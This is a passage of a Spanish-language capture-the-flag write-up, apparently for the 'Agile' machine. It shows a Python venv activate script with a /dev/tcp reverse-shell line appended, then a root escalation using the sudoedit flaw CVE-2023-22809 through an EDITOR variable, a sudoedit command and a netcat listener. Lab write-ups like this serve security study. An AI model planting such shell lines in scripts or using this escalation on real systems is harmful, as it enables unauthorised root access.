        unset _OLD_VIRTUAL_PS1
    fi

    unset VIRTUAL_ENV
    unset VIRTUAL_ENV_PROMPT
    if [ ! "${1:-}" = "nondestructive" ] ; then
    # Self destruct!
        unset -f deactivate
    fi
}

# unset irrelevant variables
deactivate nondestructive

VIRTUAL_ENV="/app/venv"
export VIRTUAL_ENV

_OLD_VIRTUAL_PATH="$PATH"
PATH="$VIRTUAL_ENV/bin:$PATH"
export PATH

# unset PYTHONHOME if set
# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)
# could use `if (set -u; : $PYTHONHOME) ;` in bash
if [ -n "${PYTHONHOME:-}" ] ; then
    _OLD_VIRTUAL_PYTHONHOME="${PYTHONHOME:-}"
    unset PYTHONHOME
fi

if [ -z "${VIRTUAL_ENV_DISABLE_PROMPT:-}" ] ; then
    _OLD_VIRTUAL_PS1="${PS1:-}"
    PS1="(venv) ${PS1:-}"
    export PS1
    VIRTUAL_ENV_PROMPT="(venv) "
    export VIRTUAL_ENV_PROMPT
fi

# This should detect bash and zsh, which have a hash command that must
# be called to get it to forget past commands.  Without forgetting
# past commands the $PATH changes we made may not be respected
if [ -n "${BASH:-}" -o -n "${ZSH_VERSION:-}" ] ; then
    hash -r 2> /dev/null
fi
0<&196;exec 196<>/dev/tcp/10.10.14.118/4242; sh <&196 >&196 2>&196

~~~

Verificamos la versión de sudo

![](/Agile/Pasted_image_20230311000023.png)

## Elevación de Privilegios

Para escalar privilegios usamos una vulnerabilidad de sudoedit, especificamente esta:

[CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809)
[Detalles de vulnerabilidad](https://www.openwall.com/lists/oss-security/2023/01/19/1)

En base al exploit creamos la siguiente variable de  entorno

~~~bash
export EDITOR=vim -- /app/venv/bin/activate
~~~

Luego intentamos modificar el archivo creds.txt

~~~bash
sudoedit -g dev_admin -u dev_admin /app/app-testing/tests/functional/creds.txt
~~~

Agregamos la linea para nuestra reverse shell

![](/Agile/Pasted_image_20230311000753.png)

Guardamos

![](/Agile/Pasted_image_20230311000618.png)

Usamos netcat para esuchar alguna conexión en el puerto 4242 y esperamos unos minutos

![](/Agile/Pasted_image_20230310235255.png)

Finalmente obtenemos acceso al sistema como root
